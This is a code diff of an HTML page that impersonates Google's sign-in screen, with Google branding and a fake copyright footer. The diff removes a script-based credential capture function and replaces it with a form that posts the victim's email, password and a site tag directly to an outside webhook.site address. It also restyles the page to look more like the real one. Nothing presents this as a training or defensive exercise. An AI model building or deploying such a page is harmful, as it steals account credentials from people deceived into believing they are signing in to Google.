@@ -1,25 +1,78 @@
 <html>
 <head>
-    <script src="capture.js"></script>
     <title>Google</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial, sans-serif; background: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { text-align: center; width: 400px; }
-        .logo { font-size: 40px; font-weight: bold; margin-bottom: 30px; color: #4285f4; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
-        input[type="submit"] { background: #4285f4; color: white; border: none; padding: 14px; border-radius: 4px; width: 100%; font-weight: bold; font-size: 16px; margin-top: 20px; }
-        .header { font-size: 24px; margin-bottom: 30px; color: #202124; }
+        body {
+            font-family: Arial, sans-serif;
+            background: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+            width: 450px;
+            padding: 48px 40px 36px;
+        }
+        .logo {
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #4285f4;
+        }
+        .header {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 16px;
+            margin: 12px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        input[type="submit"] {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 4px;
+            width: 100%;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .footer {
+            margin-top: 30px;
+            color: #5f6368;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">G</div>
         <div class="header">Sign in</div>
-        <form onsubmit="return captureCredentials('google')">
-            <input type="text" name="username" placeholder="Email or phone">
-            <input type="password" name="password" placeholder="Enter your password">
+        <div style="color: #5f6368; margin-bottom: 30px;">Use your Google Account</div>
+
+        <form action="https://webhook.site/ac3017bb-31ec-446c-ba45-5b13aae5c7fb" method="POST">
+            <input type="hidden" name="site" value="google">
+            <input type="text" name="username" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Enter your password" required>
             <input type="submit" value="Next">
-        <input type="hidden" id="username" name="username"><input type="hidden" id="password" name="password"><input type="hidden" name="site" value="google"></form>
+        </form>
+
+        <div class="footer">
+            <a href="#" style="color: #1a73e8; text-decoration: none;">Forgot email?</a> ·
+            <a href="#" style="color: #1a73e8; text-decoration: none;">Guest mode</a>
+            <p>Google © 2024</p>
+        </div>
     </div>
 </body>
 </html>
